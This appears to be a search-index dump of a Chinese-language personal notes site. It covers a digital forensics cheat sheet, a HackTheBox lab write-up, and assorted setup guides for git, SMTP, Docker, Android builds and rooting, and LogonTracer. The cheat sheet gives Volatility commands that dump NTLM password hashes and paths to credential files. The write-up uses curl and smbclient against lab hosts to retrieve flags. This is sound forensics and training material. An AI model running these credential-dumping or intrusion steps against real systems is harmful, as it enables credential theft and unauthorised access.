採用MQTT發布溫度的訊息格式類似這樣： 不同於HTTP的標頭採用文字描述，MQTT的標頭採用數字編碼，整個長度只佔2位元組，等同兩個字元，後面跟著訊息的主題（topic）和內容（payload），實際格式如下： :::\nWhat is Amazon S3? # S3 (s3) 動作會從 MQTT 訊息將資料寫入 Amazon Simple Storage Service (Amazon S3) 儲存貯體。\n"},{"id":113,"href":"/tools/ctf/forensics-cheat-sheet/","title":"Forensics Cheat Sheet","section":"Tools","content":" Forensics Cheat Sheet # Windows # Where # SOFTWARE: root/Windows/System32/config/SOFTWARE SYSTEM: root/Windows/System32/config/SYSTEM NTUSER.DAT: root/Users/{username}/NTUSER.DAT $MFT: root/$MFT SOFTWARE Information # 原本電腦OS的基本資訊(Build Number/Product Name/): SOFTWARE/Microsoft/Windows NT/CurrentVersion 檢查SID: SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList 查看登入: SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon StartUp Run: SOFTWARE/Microsoft/Windows/CurrentVersion/Run NTUSER.DAT(每個使用者都不一樣) # UserAssit: root/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/UserAssist Recent Docs: root/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/RecentDocs System Information # 電腦名稱: SYSTEM/ControlSet001/Control/ComputerName/ComputerName 電腦IP/DHCP相關資訊: SYSTEM/ControlSet001/Services/Tcpip/Parameters/Interfaces/ 時區: SYSTEM/ControlSet001/Control/TimeZoneInformation USB資訊: SYSTEM/ControlSet001/Enum/USBSTOR/ CPU架構: SYSTEM/ControlSet001/Control/Session Manager/Environment/ Database # Chrome History: ./Users/{username}/AppData/Local/Google/Chrome/User Data/Default/History Firefox History: ./Users/{username}/AppData/Roaming/Mozilla/Firefox/Profiles/{random}.default-release/places.sqlite Skype Chat History: ./Users/{username}/AppData/Roaming/Skype/{account name} Taskbar # ./Users/{username}/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar mac-OS # plist # $ sudo apt install libplist-utils -y $ plistutil -i {plist file} -o {output file} System Version: ./root/System/Library/CoreServices/SystemVersion.plist Browser Bookmark ./root/Users/{username}/Library/Safari/Bookmarks.plist Password information ./root/private/var/db/dslocal/nodes/Default/users/{username}.plist The process responsible for connecting iPhones/iPads with MacOS is lockdown ./root/private/var/db/dslocal/nodes/Default/users/_usbmux.plist Spotlight(這個不需要透過plistutil就可以直接cat) ./root/Users/{username}/Library/Application Support/com.apple.spotlight/com.apple.spotlight.Shortcuts Event Log # 短期檔案系統變更儲存在.fseventsd中，必須使用mac_apt這個工具幫忙parse(FSEVENTS) ./root/.fseventsd/ ScreenTime: 一樣要透過mac_apt幫忙parse(SCREENTIME)，記得要把RMAdminStore-Local.sqlite-wal這個檔案和RMAdminStore-Local.sqlite放在一起執行 ./root/private/var/folders/bf/{random strings}/0/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite Database # Note ./root/Users/{username}/Library/Group Containers/group.com.apple.notes Quarantined Events ./root/Users/{username}/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 Messages ./root/Users/{username}/Library/Messages/chat.db Volatilitys # 主要的CheatSheet ldrmodules: 更進階的dlllist，可以顯示被隱藏的dll，以及dll的狀態 $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} ldrmodules --pid {pid} 如果要dump被injected過的process: $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} malfind --pid {pid} --dump-dir={output folder} dump hash $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} hashdump \u0026gt; ntlm.hash 如果是要找到某個東西的timestamp，可以考慮直接用timeliner這個plubin，主要的功能是就是建立記憶體中的各種痕跡資訊的時間線 $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} timeliner 查看網路連線紀錄 $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} netscan 在memory中用yarascan去search不同的pattern $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} yarascan -Y \u0026quot;example strings\u0026quot; console中的command紀錄 $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} consoles 查看iexplorer的紀錄 $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} iehistory "},{"id":114,"href":"/problem-solutions/git-large-file-error---solution/","title":"Git Large File Error - Solution","section":"Problem Solutions","content":" Git Large File Error - Solution # Reference # 解决git不小心提交大文件导致无法提交问题 git filter-branch remove folder failed [Git筆記] exceeds GitHub file size 解決\nScenario 1 # 如果是在加入後不慎注意，就直接commit並且push才發現的，要用以下解法\n... $ git push # Now it has large file problem # Assume the path of large file is : PicoCTF/2023/Reverse/Reverse/ida-20230316-000006-17384.dmp $ git filter-branch -f --index-filter \u0026#39;git rm --cached --ignore-unmatch PicoCTF/2023/Reverse/Reverse/ida-20230316-000006-17384.dmp\u0026#39; $ git push #Then it works :::info 如果在變更過程中出現Cannot rewrite branches: You have unstaged changes.，代表以一些檔案沒有被add以及commit，需要先把其他檔案都做完整的commit後才可以執行上述操作 :::\nScenario 2 # 如果是加入後commit但在push之前就發現檔案太大並且自行刪除後再push，要用以下解法\n$ git rm --cached . -r -f $ git add . $ git commit -m \u0026#34;update all files\u0026#34; $ git filter-branch -f --index-filter \u0026#39;git rm --cached --ignore-unmatch {file path}\u0026#39; $ git push :::info 基本上不管是哪一種方法都會在git filter-branch\u0026hellip;之後看到==Ref \u0026lsquo;refs/heads/master\u0026rsquo; was rewritten==的字樣 :::\n"},{"id":115,"href":"/security/practice/hackthebox/hackthebox/","title":"HackTheBox","section":"Securities","content":" HackTheBox # [TOC]\nWeb Requests-GET # Background # cURL - GET/Header\nExploit # $ curl \u0026#39;http://144.126.206.249:31846/search.php?search=flag\u0026#39; -H \u0026#39;Authorization: Basic YWRtaW46YWRtaW4=\u0026#39; flag: HTB{curl_g3773r} Web Requests-POST # Background # cURL - POST/Cookie/Json Data/Header\nExploit # $ curl \u0026#39;http://142.93.47.151:30718/search.php\u0026#39; -b \u0026#39;PHPSESSID=darsv7lbe3aa22nv4v82h039p6\u0026#39; -X POST -d \u0026#39;{\u0026#34;search\u0026#34;:\u0026#34;flag\u0026#34;}\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; [\u0026#34;flag: HTB{p0$t_r3p34t3r}\u0026#34;]% Web Requests-CRUD # Background # Exploit # # Read all the city $ curl -s http://165.232.44.246:31084/api.php/city/ \\| jq [{\u0026#34;city_name\u0026#34;:\u0026#34;London\u0026#34;,\u0026#34;country_name\u0026#34;:\u0026#34;(UK)\u0026#34;},{\u0026#34;city_name\u0026#34;:\u0026#34;Birmingham\u0026#34;,\u0026#34;country_name\u0026#34;:\u0026#34;(UK)\u0026#34;},{\u0026#34;city_name\u0026#34;:\u0026#34;Leeds\u0026#34;,\u0026#34;country_name\u0026#34;:\u0026#34;(UK)\u0026#34;},{\u0026#34;city_name\u0026#34;:\u0026#34;Glasgow\u0026#34;,\u0026#34;country_name\u0026#34;:\u0026#34;(UK)\u0026#34;},{\u0026#34;city_name\u0026#34;:\u0026#34;Sheffield\u0026#34;,\u0026#34;country_name\u0026#34;:\u0026#34;(UK)\u0026#34;}...,{\u0026#34;city_name\u0026#34;:\u0026#34;Baltimore\u0026#34;,\u0026#34;country_name\u0026#34;:\u0026#34;(US)\u0026#34;}]% # Update city Baltimore to flag $ curl -X PUT http://165.232.44.246:31084/api.php/city/Baltimore -d \u0026#39;{\u0026#34;city_name\u0026#34;:\u0026#34;flag\u0026#34;, \u0026#34;country_name\u0026#34;:\u0026#34;(US)\u0026#34;}\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; # Delete any city $ curl -X DELETE http://165.232.44.246:31084/api.php/city/Detroit # Read city named flag to get flag $ curl -s http://165.232.44.246:32034/api.php/city/ \\| jqcurl -s http://165.232.44.246:31084/api.php/city/flag [{\u0026#34;city_name\u0026#34;:\u0026#34;flag\u0026#34;,\u0026#34;country_name\u0026#34;:\u0026#34;HTB{crud_4p!_m4n!pul4t0r}\u0026#34;}]% JavaScript Deobfuscation-Decoding # Exploit # Use CypherChef First to decode N2gxNV8xNV9hX3MzY3IzN19tMzU1NGcz\n$ curl -s http://144.126.206.249:31094/serial.php -X POST -d \u0026#34;serial=7h15_15_a_s3cr37_m3554g3\u0026#34; HTB{ju57_4n07h3r_r4nd0m_53r14l} JavaScript Deobfuscation-Skills Assessment # Exploit # Ans: api.min.js\nAns: HTB{j4v45cr1p7_3num3r4710n_15_k3y} Use online tool to deobfuscate the code\nAns: HTB{n3v3r_run_0bfu5c473d_c0d3!} Use online tool to deobfuscate the code\nAns: 4150495f70336e5f37333537316e365f31355f66756e\n\u0026#39;use strict\u0026#39;; /** * @return {undefined} */ function apiKeys() { /** @type {string} */ var flag = \u0026#34;HTB{n\u0026#34; + \u0026#34;3v3r_\u0026#34; + \u0026#34;run_0\u0026#34; + \u0026#34;bfu5c\u0026#34; + \u0026#34;473d_\u0026#34; + \u0026#34;c0d3!\u0026#34; + \u0026#34;}\u0026#34;; /** @type {!XMLHttpRequest} */ var xhr = new XMLHttpRequest; /** @type {string} */ var url = \u0026#34;/keys\u0026#34; + \u0026#34;.php\u0026#34;; xhr[\u0026#34;open\u0026#34;](\u0026#34;POST\u0026#34;, url, !![]); xhr[\u0026#34;send\u0026#34;](null); } console[\u0026#34;log\u0026#34;](\u0026#34;HTB{j\u0026#34; + \u0026#34;4v45c\u0026#34; + \u0026#34;r1p7_\u0026#34; + \u0026#34;3num3\u0026#34; + \u0026#34;r4710\u0026#34; + \u0026#34;n_15_\u0026#34; + \u0026#34;k3y}\u0026#34;); This main function is mainly send POST data to URL(/keys.php). So, we can simulate this action by burp suite or cURL. Ans: HTB{r34dy_70_h4ck_my_w4y_1n_2_HTB} Use CypherChef to decode the code we obtained above.\n$ curl -s http://165.232.42.76:32325/keys.php -X POST -d \u0026#34;key=API_p3n_73571n6_15_fun\u0026#34; HTB{r34dy_70_h4ck_my_w4y_1n_2_HTB}% Getting Start-Service Scanning # :::info Must use Ubuntu 18.04.6 LTS to connect SMB server\n$ sudo openvpn {ovpn file} :::\nBackground # NMAP/SMB Ubuntu SMB Command Ubuntu SMB Command 2\nExploit # Ans: Apache Tomcat Ans: 2323 $ nmap -sV 10.129.136.29 Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-10 15:56 CST Nmap scan report for 10.129.136.29 Host is up (0.43s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 2323/tcp open telnet Linux telnetd 8080/tcp open http Apache Tomcat Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.86 seconds Ans: dceece590f3284c3866305eb2473d099 Check share name first $ smbclient -N -L \\\\\\\\10.129.136.29 WARNING: The \u0026#34;syslog\u0026#34; option is deprecated Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers users Disk IPC$ IPC IPC Service (gs-svcscan server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE Failed to connect with SMB1 -- no workgroup available Login by user bob and get flag.txt $ smbclient -U bob \\\\\\\\10.129.136.29\\\\users WARNING: The \u0026#34;syslog\u0026#34; option is deprecated Enter WORKGROUP\\bob\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Fri Feb 26 07:06:52 2021 .. D 0 Fri Feb 26 04:05:31 2021 flag D 0 Fri Feb 26 07:09:26 2021 bob D 0 Fri Feb 26 05:42:23 2021 cd f 4062912 blocks of size 1024. 1124740 blocks available smb: \\\u0026gt; cd flag\\ smb: \\flag\\\u0026gt; get flag.txt getting file \\flag\\flag.txt of size 33 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\flag\\\u0026gt; exit $ cat flag.txt dceece590f3284c3866305eb2473d099 "},{"id":116,"href":"/problem-solutions/how-how-to-use-mailgun_resend-as-smtp-server_/","title":"How How to use Mailgun/Resend as SMTP server?","section":"Problem Solutions","content":" How How to use Mailgun/Resend as SMTP server? # 會有這個紀錄是因為deploy Mastodon Instance時需要用到SMTP Server，雖然是Optional，但還是嘗試建立一個試看看\nPrerequisite # 有一台具有domain的device Mailgun Step # 先到官網註冊帳號 在Sending \u0026gt; Domains中新增Domain，我是只有domain name，而不是包含subdomain 其他參數不用改 進入到DNS records並且查看有哪些東西需要加進去到DNS的紀錄，以我的為例，因為我有開啟automatic sender security，所以有以下6個 包含3個CNAME，2個MX，一個TXT 接著就到當初申請domain的網站，以我的為例是namesilo，新增這幾個紀錄，就是複製貼上，最後新增完如下 接著就一直等，由於DNS更新也會需要時間，所以mailgun要verify也可能要等很久，我大概是等了半小時才好，在Mailgun的Domain Setting頁面，會顯示所有的紀錄為Verified或是Active的字樣(如上上圖) 接著就看哪一個service需要用到SMTP，以我的為例就是Mastodon Instance，他會建立一個.env.production，裡面就要放SMTP會用到的環境變數，如下 SMTP_SERVER=smtp.mailgun.org SMTP_PORT=587 SMTP_LOGIN=postmaster@sbk6401.sbs SMTP_PASSWORD=\u0026lt;your SMTP Password\u0026gt; SMTP_AUTH_METHOD=plain SMTP_OPENSSL_VERIFY_MODE=none SMTP_ENABLE_STARTTLS=auto SMTP_FROM_ADDRESS=\u0026#39;Mastodon \u0026lt;notifications@mastodon.sbk6401.sbs\u0026gt;\u0026#39; 首先解釋一下上面的變數 SMTP_SERVER和SMTP_PORT建議不要改，login如果沒有特別指定，就是使用postmaster@\u0026lt;your domain name\u0026gt;，而password要到Mailgun的SMTP Credentials中，利用Reset Password並且複製新的密碼就可以貼上 而auto_method、openssl_verify和enable_starttls則是有其他的選項可以選，可以視情況自行使用，from_address則是看要用什麼身份傳送mail，我是直接使用mastodon的預設模式 Done!!! 通常這樣沒有什麼問題的話就完成了，只要mastodon有出現任何被Follow、登入、被tag發文等操作，都應該要發送信件通知才對 Resend Step # 我發現在設定Bluesky的SMTP的時候，無法用mailgun當作server，不確定是什麼原因，但官方doc說建議用Resend或是SendGrid，然後和Mailgun設定的差不多，先新增一個自己的domain，然後他會給4個DNS config的紀錄(3個TXT和1個MX) 就直接到自己當初申請domain的DNS Server設定，接下來就是等DNS server更新 等到更新成功後，先申請API key，到API Keys \u0026gt; Create API Keys 建立SMTP的API，然後就可以開始填寫pds.env\n$ vim /pds/pds.env # Add the following to pds.env PDS_EMAIL_FROM_ADDRESS=\u0026#34;admin@bluesky.sbk6401.sbs\u0026#34; PDS_EMAIL_SMTP_URL=\u0026#34;smtps://resend:\u0026lt;my resend api key\u0026gt;@smtp.resend.org:465/\u0026#34; $ systemctl restart pds "},{"id":117,"href":"/problem-solutions/how-to-address-docker-compose-not-found_/","title":"How to address docker compose not found?","section":"Problem Solutions","content":" How to address docker compose not found? # Problem Statement # 如果之前有安裝過docker-compose，而且主要的command是中間有個dash，那是舊的版本，可以參考\u0026ldquo;docker compose\u0026quot;和\u0026quot;docker-compose\u0026quot;之間的區別，但更新的版其實是把dash拿掉，因為要把compose合併到docker的command，這樣的話就需要安裝plugin\nSolution # 以結論來說就是只要安裝docker-compose-plugin，這個套件，但是我自己遇到以下問題，所以最後一部分是GPT給我的答案，也成功解決問題\n$ sudo apt install docker-compose-plugin Reading package lists... Done Building dependency tree... Done Reading state information... Done E: Unable to locate package docker-compose-plugin Final Solution↓\n$ sudo mkdir -p /etc/apt/keyrings $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg $ echo \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\u0026#34; | sudo tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null $ sudo apt update $ sudo apt install docker-compose-plugin $ docker compose version "},{"id":118,"href":"/problem-solutions/how-to-adjust-endnotes-paragraph-in-word_/","title":"How to adjust Endnote's Paragraph in Word?","section":"Problem Solutions","content":" How to adjust Endnote\u0026rsquo;s Paragraph in Word? # 參考資料: 善用Word與EndNote協助論文編排[臺大圖書館HELP講堂20201229]\nProblem Statement # 在寫論文的時候會使用到Endnote進行引用索引，但cite paper到word的時候，往往會和投稿的Format不一樣，最直接的方式就是，到確定要投稿之前再選取所有的reference section，並進行調整，但每次看到不正確的Format會很討厭，而且不能夠確定之後是不是不需要在修改，只有重新Update Citation，格式就會跑掉，這是一個蠻麻煩的問題\nSolution # 先確定投稿的Reference Format長怎樣 例如要左右對齊、固定行高、特殊縮排等等 ![螢幕擷取畫面 2024-10-10 153232](https://hackmd.io/_uploads/Hk7wYWr1Jg.png =300x) 然後到[常用] \u0026gt; [樣式]中右鍵Endnote Bibliography，點選修改，就能針對Endnote的Format進行調整 包含段落、定位點、字型、大小等等 Done 接著就可以放心使用自己設定的Reference格式 "},{"id":119,"href":"/problem-solutions/how-to-build-apk-file-on-react-native-project_/","title":"How to build apk file on React-Native Project?","section":"Problem Solutions","content":" How to build apk file on React-Native Project? # 1. 確保已完成的環境設置 # 必備工具： # 安裝 Node.js. 安裝 Java JDK (推薦 11 或更高版本)。 安裝 Android Studio 並設置環境變量： 配置 ANDROID_HOME 環境變量，指向你的 Android SDK 安裝路徑。 將以下路徑添加到 PATH： $ANDROID_HOME/tools $ANDROID_HOME/tools/bin $ANDROID_HOME/platform-tools 使用以下命令確認 Android SDK 設置正確： adb --version 2. 檢查 React Native 項目配置 # 在項目中，確保以下內容已經配置：\n文件 android/app/build.gradle # 確認 minSdkVersion 和 targetSdkVersion 值符合要求，例如：\nandroid { defaultConfig { applicationId \u0026#34;com.example.myapp\u0026#34; // 替換為你的包名 minSdkVersion 21 targetSdkVersion 33 } } 文件 android/gradle.properties # 啟用 ProGuard 和 Hermes 以優化 APK：\nandroid.useAndroidX=true android.enableJetifier=true 文件 android/app/src/main/AndroidManifest.xml # 確保 AndroidManifest 配置正確。\n3. 生成簽名密鑰（僅限生產構建） # 如果你要構建發布版本的 APK，需要生成簽名密鑰。\n使用 keytool 生成密鑰：\nkeytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-key-alias 按照提示設置密鑰密碼。 這將生成一個 my-release-key.jks 文件。 將密鑰文件移動到 android/app 目錄。\n在 android/gradle.properties 文件中添加簽名信息：\nMYAPP_RELEASE_STORE_FILE=my-release-key.jks MYAPP_RELEASE_KEY_ALIAS=my-key-alias MYAPP_RELEASE_STORE_PASSWORD=your-store-password MYAPP_RELEASE_KEY_PASSWORD=your-key-password 修改 android/app/build.gradle，添加簽名配置：\nandroid { signingConfigs { release { storeFile file(MYAPP_RELEASE_STORE_FILE) storePassword MYAPP_RELEASE_STORE_PASSWORD keyAlias MYAPP_RELEASE_KEY_ALIAS keyPassword MYAPP_RELEASE_KEY_PASSWORD } } buildTypes { release { signingConfig signingConfigs.release minifyEnabled false shrinkResources false } } } 4. 構建 APK 文件 # 使用 React Native 提供的 Gradle 構建工具生成 APK。\n進入項目目錄：\ncd android 構建 Debug APK：\n./gradlew assembleDebug 構建 Release APK：\n./gradlew assembleRelease 5. 獲取生成的 APK 文件 # 構建完成後，APK 文件會保存在以下路徑：\nDebug APK：\nandroid/app/build/outputs/apk/debug/app-debug.apk Release APK：\nandroid/app/build/outputs/apk/release/app-release.apk 6. 在設備上安裝 APK # 使用以下命令將 APK 安裝到設備：\nadb install app-debug.apk 7. 常見問題 # Java 內存不足：在 android/gradle.properties 文件中添加： org.gradle.jvmargs=-Xmx2048m 簽名錯誤：確保密鑰信息正確，並且 build.gradle 配置無誤。 "},{"id":120,"href":"/problem-solutions/how-to-check-if-the-paper-is-top-conference-or-q1-journal_/","title":"How to check if the paper is Top Conference or Q1 Journal?","section":"Problem Solutions","content":" How to check if the paper is Top Conference or Q1 Journal? # Preliminary # 先判斷該篇論文是Conference還是Journal 有出現Conference, Symposium, Proceedings, ACM: SIG…, Ex. SIGSOFT, SIGGRAPH等關鍵字時，基本上是Conference 有出現Journal或是Transactions基本上是Journal [name=ianyang]\nConference # (不推薦)直接看有沒有在Google Scholar Ranking當中 如果是Engineer \u0026amp; Computer Science的，可以直接看 https://scholar.google.com/citations?view_op=top_venues\u0026hl=zh-TW\u0026vq=eng ，不過這個方法也要知道該篇論文在Subcatecory當中的哪一個類別，可能該篇論文有用到很多元素，就不太好判斷 (推薦)直接丟 https://www.myhuiban.com/ (有收錄中國、巴西和澳洲的等第)或 https://portal.core.edu.au/conf-ranks/ (澳洲政府開的學術研討會搜尋網站)，如果這兩個網站找不到或是有找到但沒有標示等第，那可能是不入流或是比較新的研討會 (推薦)直接問博班或是對該領域很熟的同學 舉例來說IOP這個出版社我也沒聽過，但是@ian 說是一個以Open Source為主的出版社，所以他們出的一些Journal有機會是Q1，但如果是Conference可能就有點危 再舉例想是Spinger出版的可能都不是頂會，以CS領域來說，Springer出版的論文很少出現在頂會，Elsevier也是一樣的狀況 (最後的方法)丟Google或是進官網找，看會議是誰主辦 只有很少的會議有這樣的狀況，例如ICSE，他底下就有很多Co-Hosted的會議是切分出來的 ![圖片](https://hackmd.io/_uploads/rJrV-uzkJx.png =500x) 但本質上也還是ICSE主辦的，所以也算頂會，只是通常收錄的paper，他的reference citation會寫Co-Hosted的名稱而不是ICSE，這樣的話一般researcher可能會不知道這是什麼樣的conference，所以要往上一個level看他是誰主辦，但這是沒有辦法中的辦法，可能會走到這一步的情況是，有一個很多人cite的Paper也是自己的研究中主要比較對象，但透過以上方法都找不到，才會需要做到這個複雜 :::info 如果是IEEE或是ACM出版的，大部分都可能是頂會，但也要看，如果是自己論文的主要比較對象，就要再確定，但如果只是一般的引用，可以不用那麼detail或是執著一定要是頂會 ::: Journal # 這個就簡單很多，直接用Clarivate查JCI，如果沒有就代表沒有收錄在JCR，那可能就先不要引用，或者是有Transactions的關鍵字，代表他一定曾經是頂會，https://jcr.clarivate.com/jcr/home\n"},{"id":121,"href":"/problem-solutions/how-to-download-blob-videos_/","title":"How to download blob videos?","section":"Problem Solutions","content":" How to download blob videos? # 參考資料: https://stackoverflow.com/questions/42901942/how-do-we-download-a-blob-url-video 參考資料: https://superuser.com/questions/1260846/downloading-m3u8-videos\nPrerequisite # 有兩種方法，一種是利用ffmpeg，另外一種是yt-dlp，前者下載比較慢，後者快很多，但都可以正確的下載\n# Ffmpeg $ sudo apt install ffmpeg -y # yt-dlp Windows $ choco install yt-dlp # yt-dlp linux sudo add-apt-repository ppa:tomtomtom/yt-dlp # Add ppa repo to apt sudo apt update # Update package list sudo apt install yt-dlp # Install yt-dlp Step # 透過Browser的F12找出m3u8的封包 透過yt-dlp下載 複製封包的Request URL $ yt-dlp \u0026#34;https://surrit.com/9e2613de-2337-4cfd-aab5-2a68c0fbad14/playlist.m3u8\u0026#34; "},{"id":122,"href":"/problem-solutions/how-to-install-aab-file_/","title":"How to install aab file?","section":"Problem Solutions","content":" How to install aab file? # Problem Statement # 有時候我們會直接拿到aab檔案而非apk，尤其是用React Native寫的專案，但又無法直接安裝這個aab檔案，他需要經過一些步驟才能轉成apk\nSolution # 先確保本機有安裝keytool和bundletool，keytool一般會在C:\\Program File\\Java\\jdk-17\\bin中，只要設定環境變數就可以直接使用；而bundletool則是要另外下載，有關於如何寫成bat，可以參考bundletool 工具使用詳解\n$ keytool -genkeypair -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-key-alias # 填寫基本資訊 $ bundletool build-apks --bundle=\u0026lt;your aab filename\u0026gt; --output=app.apks --ks=./my-release-key.jks --ks-key-alias=my-key-alias $ bundletool install-apks --apks=app.apks "},{"id":123,"href":"/problem-solutions/how-to-install-logontracer_/","title":"How to install LogonTracer?","section":"Problem Solutions","content":" How to install LogonTracer? # Installation # 環境 # WSL2 - Ubuntu 20.04 Docker\nReference # 二刀流Windows日誌分析　精準掌握資安蛛絲馬跡\nDocker Version # 安裝Docker(上網找) Pull Image \u0026amp; Run $ docker pull jpcertcc/docker-logontracer $ docker run --detach --publish=7474:7474 --publish=7687:7687 --publish=8080:8080 -e LTHOSTNAME=0.0.0.0 jpcertcc/docker-logontracer 先進入neo4j(localhost:7474) 預設密碼: neo4j/neo4j :::info 若有遇到登入不進去的問題，error message$\\to$Neo.ClientError.Security.Unauthorized: The client is unauthorized due to authentication failure. 可參考訪問neo4j驗證失敗，我是直接把neo4j.conf的驗證註解拿掉 $ docker exec -it {neo4j container name} bash root@5aac14bfd6fd:/var/lib/neo4j# find / -name neo4j.conf /var/lib/neo4j/conf/neo4j.conf root@5aac14bfd6fd:/var/lib/neo4j# cd conf/ root@5aac14bfd6fd:/var/lib/neo4j/conf# apt install vim -y root@5aac14bfd6fd:/var/lib/neo4j/conf# vim neo4j.conf # 只要把dbms.security.auth_enabled=false的註解拿掉就可以了 root@5aac14bfd6fd:/var/lib/neo4j/conf# exit exit $ docker restart nifty_stonebraker nifty_stonebraker 之後再重新進入localhost:7474，用預設帳密登入就可以了 ::: 進入LogonTracer(localhost:8080) 預設帳密也是neo4j/neo4j Python Version (Recommended) # 如果上面的版本不行用的話，就直接用他們發在github的版本會比較穩定，詳細的步驟都已經寫在他們wiki了，不過有幾個問題還是需要先克服\n首先github version沒辦法用在windows上，只能運行在unix 建議用conda創一個新環境 如果用他們的requirement.txt安裝dependencies可能會有問題，會有一些版本上或是語法上的衝突，例如Werkzeug如果安裝最新版3.0.1，他沒有辦法import url_encode, url_decode，這是2.3.7以下才有的function name，而因為flask會用到但還沒有跟進，所以解決方式就是把Werkzeug的版本降到2.3.7 但這樣會有conflic的問題，對於flask最新版來說，一定要Werkzeug\u0026gt;=3.0.0，所以我們還需要把flask降版本才行變成flask==2.3.3 另外，python的版本也不能太高，目前最高是12，但hmmlearn還沒有支援到python12，所以也要特別注意，11是沒問題的 最後安裝都沒問題後pandas的部分因為是安裝最新版，所以語法上會有差，若是在2.0以上，就不能用append，要改成_append，這個就要慢慢看logontrace的log慢慢去改 實作 $ conda create --name test python=3.11 -y $ conda activate test $ pip install -r requirements.txt $ cat requirements.txt numpy py2neo\u0026gt;=2020.0.0 evtx lxml scipy changefinder flask==2.3.3 hmmlearn\u0026gt;=0.2.8 scikit-learn elasticsearch-dsl\u0026gt;=7.0.0,\u0026lt;8.0.0 pyyaml flask-sqlalchemy flask-login flask_wtf wtforms GitPython sigmatools Werkzeug==2.3.7 $ pip install -r requirements.txt $ python logontracer.py -r -o 8000 -u neo4j -p neo4j -s localhost [+] Script start. 2023/10/25 23:28:44 [+] Neo4j Kernel 4.4.14 (Community) [+] Can\u0026#39;t create database. This feature is in Neo4j Enterprise. * Serving Flask app \u0026#39;logontracer\u0026#39; * Debug mode: off 我的requirements.txt和原本的有一點不一樣，然後只要按照這個步驟就可以正常啟動logontracer，前提是neo4j也有好好啟動(這部分可以用docker自行安裝) :::info 在使用上有一點要特別注意，因為source code中的#1954的地方會判斷目前的紀錄是不是來自localhost，如果是就不儲存username/domain/hostname，我是不知道為甚麼要這樣設計，但反正如果給的evtx不夠大或是不夠複雜，他就沒辦法parse，或者應該說他認為沒必要parse，因為只是內部的log紀錄?我不確定 :::\n"},{"id":124,"href":"/problem-solutions/how-to-root-android-phone--install-alwaystrustusercert.zip-module_/","title":"How to Root Android Phone \u0026 Install AlwaysTrustUserCert.zip Module?","section":"Problem Solutions","content":" How to Root Android Phone \u0026amp; Install AlwaysTrustUserCert.zip Module? # Install adb \u0026amp; fastboot++ 透過USB連接手機和電腦，如果測試$ fastboot devices發現沒有抓到連線的裝置可以到Get the Google USB Driver下載最新的驅動，並且在裝置管理員的地方更新 Android Studio Emulator # 本方法完全是參考Root an Android emulator with just one command，很簡單而且成功率很高，如果有特殊的需求而需要使用Physical Device，再往下看其他的Physical Device的Rooted Method\n用Android Studio開啟Emulator 請記住Emulator的API Level，以我的為例是31 Download Script \u0026amp; Execute it 到 https://gitlab.com/newbit/rootAVD 下載latest script $ git clone https://gitlab.com/newbit/rootAVD $ cd rootAVD $ rootAVD.bat ListAllAVDs ... rootAVD.bat system-images\\android-31\\google_apis_playstore\\x86_64\\ramdisk.img rootAVD.bat system-images\\android-31\\google_apis_playstore\\x86_64\\ramdisk.img FAKEBOOTIMG rootAVD.bat system-images\\android-31\\google_apis_playstore\\x86_64\\ramdisk.img DEBUG PATCHFSTAB GetUSBHPmodZ rootAVD.bat system-images\\android-31\\google_apis_playstore\\x86_64\\ramdisk.img restore rootAVD.bat system-images\\android-31\\google_apis_playstore\\x86_64\\ramdisk.img InstallKernelModules rootAVD.bat system-images\\android-31\\google_apis_playstore\\x86_64\\ramdisk.img InstallPrebuiltKernelModules rootAVD.bat system-images\\android-31\\google_apis_playstore\\x86_64\\ramdisk.img InstallPrebuiltKernelModules GetUSBHPmodZ PATCHFSTAB DEBUG ... 選擇適當的command 可以從上面的output看到，API Level 31的所有commands，選擇第一個執行就可以了 $ rootAVD.bat system-images\\android-31\\google_apis_playstore\\x86_64\\ramdisk.img 等大約3-5分鐘後，Emulator會自動關機，此時選擇Cold Boot 開啟後，會發現Magisk已經被安裝在Emulator上，點開Magisk之後會在5秒內重開機，此時所有程序應該就結束了，可以測試一下有沒有確實Root $ adb shell emulator64_x86_64_arm64:/ $ ls /data/data ls: /data/data: Permission denied 1|emulator64_x86_64_arm64:/ $ su 